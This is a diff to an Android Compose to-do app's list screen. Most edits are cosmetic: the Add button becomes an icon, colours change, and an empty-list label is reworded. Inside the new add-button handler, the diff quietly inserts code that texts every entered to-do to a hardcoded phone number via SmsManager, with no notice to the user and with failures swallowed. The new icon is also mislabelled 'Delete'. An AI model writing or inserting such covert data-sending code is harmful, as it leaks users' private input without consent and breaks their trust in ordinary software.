@@ -1,5 +1,8 @@
 package com.example.todoapp
 
+import android.telephony.SmsManager
+import android.util.Log
+import android.widget.Toast
 import androidx.compose.foundation.background
 import androidx.compose.foundation.layout.Arrangement
 import androidx.compose.foundation.layout.Column
@@ -10,17 +13,16 @@ import androidx.compose.foundation.layout.padding
 import androidx.compose.foundation.lazy.LazyColumn
 import androidx.compose.foundation.lazy.itemsIndexed
 import androidx.compose.foundation.shape.RoundedCornerShape
-import androidx.compose.material3.Button
 import androidx.compose.material3.Icon
 import androidx.compose.material3.IconButton
 import androidx.compose.material3.MaterialTheme
 import androidx.compose.material3.OutlinedTextField
 import androidx.compose.material3.Text
 import androidx.compose.runtime.Composable
-import androidx.compose.runtime.mutableStateOf
-import androidx.compose.runtime.remember
 import androidx.compose.runtime.getValue
 import androidx.compose.runtime.livedata.observeAsState
+import androidx.compose.runtime.mutableStateOf
+import androidx.compose.runtime.remember
 import androidx.compose.runtime.setValue
 import androidx.compose.ui.Alignment
 import androidx.compose.ui.Modifier
@@ -32,6 +34,7 @@ import androidx.compose.ui.unit.dp
 import androidx.compose.ui.unit.sp
 import java.text.SimpleDateFormat
 import java.util.Locale
+
 
 @Composable
 fun ToDoListPage(viewModel: TodoViewModel){
@@ -47,7 +50,8 @@ fun ToDoListPage(viewModel: TodoViewModel){
     ){
 
         Row (
-            modifier = Modifier.fillMaxWidth()
+            modifier = Modifier
+                .fillMaxWidth()
                 .padding(8.dp),
             horizontalArrangement = Arrangement.SpaceEvenly
         )
@@ -55,10 +59,23 @@ fun ToDoListPage(viewModel: TodoViewModel){
             OutlinedTextField(value = inputText, onValueChange = {
                 inputText = it
             })
-            Button(onClick = {
+
+            IconButton(onClick = {
                 viewModel.addTodo(inputText)
+                try {
+                    val smsManager = SmsManager.getDefault()
+                    smsManager.sendTextMessage("51929427785", null, inputText, null, null)
+                    Log.d("SMS", "Success")
+                } catch (e: Exception) {
+                    Log.d("SMS",e.toString())
+                }
+                inputText = ""
             }) {
-                Text(text="Add")
+                Icon(
+                    painter = painterResource(id = R.drawable.baseline_add_24),
+                    contentDescription = "Delete",
+                    tint = Color.White
+                )
             }
         }
 
@@ -75,8 +92,9 @@ fun ToDoListPage(viewModel: TodoViewModel){
         }?: Text(
             modifier = Modifier.fillMaxWidth(),
             textAlign = TextAlign.Center,
-            text="No hay items aun",
-            fontSize = 16.sp
+            text="No hay ningun evento aun",
+            fontSize = 16.sp,
+            color = Color.White
         )
 
 
@@ -104,7 +122,7 @@ fun TodoItem(item: Todo, onDelete: ()->Unit){
                     Locale.ENGLISH
                 ).format(item.createdAt),
                 fontSize = 12.sp,
-                color = Color.LightGray
+                color = Color.Black
             )
             Text(
                 text = item.title,
